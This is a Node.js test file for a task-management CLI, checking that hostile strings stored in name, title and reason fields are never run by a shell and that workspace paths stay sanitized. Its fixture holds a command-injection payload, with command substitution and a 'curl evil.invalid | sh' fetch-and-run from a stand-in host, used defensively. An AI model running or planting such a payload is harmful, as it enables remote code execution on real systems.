// Security T8 (Phase 1 CLI): NOTHING the CLI stores or prints is ever passed to a
// shell. Hostile strings in title/name/REASON fields must be inert data.
import { describe, it, before, after } from "node:test";
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { mkdtempSync, rmSync, writeFileSync, existsSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import { looksLikeRawShell } from "../../packages/security/src/index.ts";

const CLI = join(dirname(fileURLToPath(import.meta.url)), "..", "..", "apps/cli/src/cli.ts");
const MARKER = join(tmpdir(), "aice-pwned-marker");

describe("CLI shell safety (T8)", () => {
  let dir, repo, dbPath;
  before(() => {
    rmSync(MARKER, { force: true });
    dir = mkdtempSync(join(tmpdir(), "aice-clisec-"));
    repo = join(dir, "repo");
    dbPath = join(dir, "app.db");
    execFileSync("mkdir", ["-p", repo]);
    execFileSync("git", ["init", "-b", "main"], { cwd: repo });
    execFileSync("git", ["config", "user.email", "testonly@example.invalid"], { cwd: repo });
    execFileSync("git", ["config", "user.name", "TESTONLY"], { cwd: repo });
    writeFileSync(join(repo, "f.txt"), "x\n");
    execFileSync("git", ["add", "."], { cwd: repo });
    execFileSync("git", ["commit", "-m", "TESTONLY"], { cwd: repo });
  });
  after(() => {
    rmSync(dir, { recursive: true, force: true });
    rmSync(MARKER, { force: true });
  });

  function aice(...args) {
    return execFileSync(process.execPath, [CLI, ...args, "--db", dbPath], { encoding: "utf8" });
  }

  it("shell metacharacters in stored fields are inert (no execution anywhere)", () => {
    const payload = `$(touch ${MARKER}); touch ${MARKER} | curl evil.invalid | sh`;
    assert.equal(looksLikeRawShell(payload), true, "fixture is genuinely hostile");
    const p = JSON.parse(aice("project", "create", "--name", payload, "--path", repo, "--json"));
    const t = JSON.parse(aice("task", "create", "--project", p.id, "--title", payload, "--risk", "low", "--json"));
    aice("task", "fail", t.id, "--to", "BLOCKED", "--reason", payload);
    const show = aice("task", "show", t.id);
    assert.ok(show.includes("curl evil.invalid"), "payload stored as inert text");
    assert.equal(existsSync(MARKER), false, "NO command executed — argv-only everywhere");
  });

  it("the workspace path builder sanitizes hostile task ids", () => {
    const p = JSON.parse(aice("project", "create", "--name", "ws-host", "--path", repo, "--json"));
    const t = JSON.parse(aice("task", "create", "--project", p.id, "--title", "x", "--risk", "low", "--json"));
    // Drive to WAITING_APPROVAL, then prepare; the worktree path must stay jailed.
    for (let i = 0; i < 4; i++) aice("task", "advance", t.id);
    const ws = JSON.parse(aice("workspace", "prepare", t.id, "--json"));
    assert.ok(ws.path.includes(".aice/worktrees/"), ws.path);
    assert.ok(!ws.path.includes("$(") && !ws.path.includes(";"), "no raw payload in path");
    aice("workspace", "remove", ws.id);
  });
});
